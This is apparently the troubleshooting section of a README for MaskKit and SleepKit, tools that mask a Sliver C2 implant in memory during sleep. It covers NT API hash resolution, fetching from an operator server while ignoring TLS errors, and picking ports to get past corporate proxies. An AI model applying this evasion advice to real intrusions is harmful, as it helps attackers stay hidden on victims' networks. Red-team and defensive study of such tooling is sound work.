`NtWaitForSingleObject` wasn't resolved by `patch_resolve`. This is almost always caused by the hash constants in `services.c` being wrong. Run `./maskkit gen-hashes` and compare with the `#define H_*` values in `src/services.c`.

### SleepKit

**mask.exe not found after build**
SleepKit uses pure Go cross-compilation (CGO_ENABLED=0) and does not require mingw-w64. Check that Go is in PATH: `which go` or `go version`. If Go is missing from PATH, add it or use the full path to the Go binary.

**WinHTTP fetch fails on target**
- Ensure the operator HTTPS server is reachable from the target network
- The EXE ignores TLS certificate errors, so self-signed certs are fine
- Check if a corporate proxy intercepts HTTPS — use `--url` with a port that isn't commonly blocked (e.g., 443 instead of 8443)

**Crash in timer goroutine**
Possible race condition between the timer masking and the Sliver Go runtime's own GC or goroutine scheduling. Increase `--sleep` interval to reduce collision frequency. The `NtSuspendThread` call freezes the OS thread, but Go may have other threads (GOMAXPROCS > 1) that the GC runs on. This is an inherent limitation of the external-masker approach.
